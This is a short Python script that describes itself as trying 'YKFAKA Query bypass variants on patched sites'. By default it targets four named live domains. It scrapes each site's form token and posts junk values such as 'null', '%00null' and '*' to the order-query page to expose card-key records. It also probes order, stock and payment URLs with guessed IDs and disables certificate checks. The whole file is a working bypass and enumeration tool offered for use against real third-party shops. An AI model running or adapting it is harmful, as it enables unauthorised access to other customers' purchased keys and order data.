#!/usr/bin/env python3
"""Try YKFAKA Query bypass variants on patched sites."""
import json
import re
import sys

import requests

requests.packages.urllib3.disable_warnings()

SITES = sys.argv[1:] or [
    "https://bwqq.top",
    "https://tjqq.top",
    "https://xmqqw.vip",
    "https://gao1314.com",
]
TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)
KM_RE = re.compile(r"/Query_Km/([a-f0-9]{12})")
VALUES = [
    "null",
    "NULL",
    "Null",
    "0",
    "",
    " ",
    "undefined",
    "none",
    "%00null",
    "1",
    "*",
    "true",
    "false",
    "NaN",
]


def probe(base):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0", "Referer": base + "/Query.html"})
    q = s.get(base + "/Query.html", timeout=15)
    tok = TOKEN_RE.search(q.text)
    if not tok:
        return {"site": base, "error": "no token"}
    token = tok.group(1) or tok.group(2)
    hits = []
    for v in VALUES:
        p = s.post(
            base + "/Query.html",
            data={"value": v, "page": "1", "__token__": token},
            timeout=15,
        )
        kms = KM_RE.findall(p.text)
        blocked = "非法" in p.text
        if kms or (not blocked and len(p.text) > 1000):
            hits.append(
                {"v": repr(v), "kms": len(kms), "len": len(p.text), "blocked": blocked}
            )
    alts = []
    for path in [
        "/Query.html?page=1&value=null",
        "/Query_Km/000000000001",
        "/Get_Yk_KC.html?ddid=000000000001",
        "/R_YkPay/000000000001",
        "/Pay",
        "/Trade/1.html",
    ]:
        r = s.get(base + path, timeout=10)
        alts.append(
            {
                "path": path,
                "status": r.status_code,
                "len": len(r.text),
                "snip": r.text[:100].replace("\n", " "),
            }
        )
    return {"site": base, "hits": hits, "alts": alts}


def main():
    out = [probe(b) for b in SITES]
    print(json.dumps(out, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
